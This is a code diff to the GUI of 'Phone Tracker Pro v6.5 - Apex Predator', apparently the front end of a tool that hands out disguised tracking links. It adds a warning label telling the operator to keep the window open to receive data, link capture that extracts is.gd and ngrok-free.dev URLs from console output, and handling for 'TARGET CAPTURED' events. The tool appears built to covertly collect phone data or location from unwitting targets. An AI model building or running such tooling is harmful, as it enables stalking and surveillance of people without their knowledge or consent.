@@ -15,7 +15,7 @@ class App(ctk.CTk):
     def __init__(self):
         super().__init__()
 
-        self.title("Phone Tracker Pro v6.1 - Super Intel")
+        self.title("Phone Tracker Pro v6.5 - Apex Predator")
         self.config_file = "config.json"
         self.geometry("1000x800")
         self.grid_columnconfigure(1, weight=1)
@@ -111,6 +111,11 @@ class App(ctk.CTk):
 
         # Tracking Link Row
         self.link_frame = ctk.CTkFrame(self.tabview.tab("Dashboard"), fg_color="transparent")
+        
+        self.warning_lbl = ctk.CTkLabel(self.tabview.tab("Dashboard"), 
+                                        text="⚠️ MANTENGA ESTA VENTANA ABIERTA PARA RECIBIR DATOS", 
+                                        text_color="orange", font=ctk.CTkFont(weight="bold"))
+        self.warning_lbl.grid(row=4, column=0, pady=5)
         self.link_frame.grid(row=3, column=0, sticky="ew", padx=10, pady=(0, 10))
         self.link_frame.grid_columnconfigure(1, weight=1)
 
@@ -298,15 +303,18 @@ class App(ctk.CTk):
             self.console_textbox.see("end")
         self.console_textbox.configure(state="disabled")
         
-        # Parse for tracking link
-        if "TRACKING_LINK:" in text:
-            try:
-                link = text.split("TRACKING_LINK:")[1].strip().split()[0]
-                self.link_entry.delete(0, "end")
-                self.link_entry.insert(0, link)
-                self.link_entry.configure(text_color="#44ff44")
-            except:
-                pass
+        # Ghost Intel Link-Capture (v6.3)
+        if "https://" in text:
+            import re
+            # Strip ANSI color codes
+            clean_text = re.sub(r'\x1b\[[0-9;]*[mK]', '', text)
+            links = re.findall(r"(https?://\S+)", clean_text)
+            for link in links:
+                l = link.strip().strip("'").strip('"').strip(']').strip('[')
+                if "is.gd" in l or "ngrok-free.dev" in l:
+                    self.link_entry.configure(state="normal")
+                    self.link_entry.delete(0, "end")
+                    self.link_entry.insert(0, l)
         
         # Process events for Stat Cards
         if "TARGET CAPTURED" in text:
